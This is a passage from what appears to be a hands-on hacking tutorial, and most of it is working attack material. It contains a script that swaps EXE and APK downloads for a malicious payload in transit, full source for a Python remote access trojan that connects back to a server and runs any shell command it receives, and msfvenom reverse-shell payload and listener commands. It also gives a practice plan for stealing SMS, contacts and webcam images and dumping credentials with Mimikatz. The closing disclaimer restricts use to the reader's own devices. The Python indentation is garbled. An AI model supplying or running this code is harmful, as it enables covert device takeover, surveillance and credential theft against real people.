		if (res.ContentType.indexOf("application/octet-stream") >= 0) {
			if (req.Path.indexOf(".exe") >= 0) {
				log("[*] Replacing EXE download: " + req.Path);
				
				// Read our payload
				var payload = readFile("/tmp/payload.exe");
				res.Body = payload;
			}
		}
		
		// If downloading APK, replace with ours
		if (res.ContentType.indexOf("android") >= 0 ||
			req.Path.indexOf(".apk") >= 0) {
			log("[*] Replacing APK download: " + req.Path);
		res.Body = readFile("/tmp/payload.apk");
			}
	}
	```
	
	---
	
	## 14. Building Your Own Payloads
	
	### Custom Python RAT (Remote Access Trojan)
	
	```python
	# rat_server.py — Server (runs on your Parrot OS laptop)
	import socket
	import threading
	import sys
	
	class RATServer:
	def __init__(self, host='0.0.0.0', port=4444):
	self.host = host
	self.port = port
	self.clients = {}
	
	def handle_client(self, conn, addr):
	client_id = f"{addr[0]}:{addr[1]}"
	self.clients[client_id] = conn
	print(f"\n[+] New connection: {client_id}")
	
	while True:
		try:
		command = input(f"\n[{client_id}] $ ")
		if not command:
			continue
			
			conn.send(command.encode())
			
			if command.lower() == 'exit':
				break
				
				response = b''
				while True:
					chunk = conn.recv(4096)
					response += chunk
					if len(chunk) < 4096:
						break
						
						print(response.decode())
						
						except:
						break
						
						print(f"[-] Connection lost: {client_id}")
						del self.clients[client_id]
						conn.close()
						
						def start(self):
						server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
						server.bind((self.host, self.port))
						server.listen(5)
						print(f"[*] RAT Server listening on {self.host}:{self.port}")
						
						while True:
							conn, addr = server.accept()
							t = threading.Thread(target=self.handle_client, args=(conn, addr))
							t.daemon = True
							t.start()
							
							if __name__ == '__main__':
								server = RATServer()
								server.start()
								```
								
								```python
								# rat_client.py — Client (runs on TARGET device)
								import socket
								import subprocess
								import os
								import time
								
								SERVER_IP = '192.168.1.10'   # Your Parrot OS IP
								SERVER_PORT = 4444
								
								def connect_and_run():
								while True:
									try:
									s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
									s.connect((SERVER_IP, SERVER_PORT))
									
									while True:
										command = s.recv(4096).decode()
										
										if command.lower() == 'exit':
											s.close()
											return
											
											# Execute command
											try:
											output = subprocess.check_output(
												command,
											shell=True,
											stderr=subprocess.STDOUT,
											timeout=10
											)
											s.send(output)
											except subprocess.TimeoutExpired:
											s.send(b'Command timed out')
											except Exception as e:
											s.send(str(e).encode())
											
											except:
											time.sleep(10)  # Wait and reconnect
											continue
											
											connect_and_run()
											```
											
											---
											
											## 15. Detecting and Defending Against These Attacks
											
											Understanding attacks helps you build better defenses.
											
											### Detect Metasploit Connections
											
											```bash
											# Check for unusual outbound connections on target
											netstat -antp | grep ESTABLISHED
											
											# Look for connections to unusual ports
											# Meterpreter often uses: 4444, 5555, 6666, 8080
											
											# Check running processes for suspicious items
											ps aux | grep -v grep | grep -E "python|ruby|nc|bash -i"
											
											# Check crontab for persistence
											crontab -l
											cat /etc/cron*
											
											# Check systemd services
											systemctl list-units --type=service | grep -v inactive
											```
											
											### Detect RATs on Android
											
											```bash
											# Via ADB:
											adb shell netstat -an
											# Look for connections to unusual IPs
											
											adb shell ps | grep -v system
											# Look for unusual processes
											
											adb logcat | grep "permission\|network\|camera\|microphone"
											# Look for unauthorized access attempts
											```
											
											### Harden Your Lab Devices
											
											```bash
											# Android:
											# Settings → Developer Options → Turn OFF USB Debugging when not using
											# Settings → Security → Unknown Sources → OFF
											# Don't install APKs from unknown sources!
											
											# Windows:
											# Windows Update → Keep fully updated
											# Windows Defender → Always on
											# Firewall → Block incoming connections
											
											# Linux:
											sudo ufw enable          # Enable firewall
											sudo ufw default deny incoming
											sudo ufw allow out
											sudo apt update && sudo apt upgrade -y  # Keep updated
											
											# Check for suspicious files
											find / -mtime -1 -type f 2>/dev/null | grep -v proc
											# Files modified in last 24 hours
											```
											
											---
											
											## 16. Tools Reference
											
											| Tool | Use | Command |
											|---|---|---|
											| **Metasploit** | Exploitation framework | `msfconsole` |
											| **msfvenom** | Payload generator | `msfvenom -p ... -o file` |
											| **Bettercap** | MITM + network attacks | `bettercap -iface eth0` |
											| **ADB** | Android control | `adb shell` |
											| **Drozer** | Android app attacks | `drozer console connect` |
											| **Nmap** | Network scanning | `nmap -A target` |
											| **SET** | Social engineering | `setoolkit` |
											| **Routersploit** | Router exploitation | `rsf` |
											| **Hashcat** | Password cracking | `hashcat -m 1000 ...` |
											| **Wireshark** | Traffic analysis | `wireshark` |
											| **Netcat** | Simple reverse shells | `nc -lvnp 4444` |
											
											### Practice Order (Recommended)
											
											```
											Week 1: Basics
											→ Learn msfconsole navigation
											→ Generate APK payload with msfvenom
											→ Install on your own Android
											→ Get Meterpreter session
											→ Run: sysinfo, screenshot, geolocate
											
											Week 2: Post-Exploitation
											→ Dump contacts, SMS from your phone
											→ Take webcam photo remotely
											→ Practice file download/upload
											→ Try privilege escalation
											
											Week 3: Windows
											→ Create Windows payload
											→ Get Meterpreter on Windows VM
											→ Run Mimikatz, dump credentials
											→ Try persistence
											
											Week 4: Network
											→ Combine ARP poisoning + payload delivery
											→ Try SMB scanning
											→ Practice pivoting
											
											Month 2+:
											→ Build your own Python RAT
											→ Study CVEs and real exploits
											→ Try HackTheBox / TryHackMe machines
											→ Get OSCP certification eventually
											```
											
											---
											
											## Quick Reference
											
											### Generate Payload
											```bash
											# Android
											msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.apk
											
											# Windows
											msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o payload.exe
											
											# Linux
											msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o payload
											```
											
											### Start Listener
											```bash
											msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST YOUR_IP; set LPORT 4444; run"
											```
											
											### Common Meterpreter Commands
											```
											screenshot    webcam_snap    record_mic    geolocate
											dump_sms      dump_contacts  dump_calllog  hashdump
											download      upload         shell         getsystem
											keyscan_start keyscan_dump   persistence   clearev
											```
											
											---
											
											*Study these techniques on your own devices only.*
											*The goal is to understand how attackers think — so you can build better defenses.*
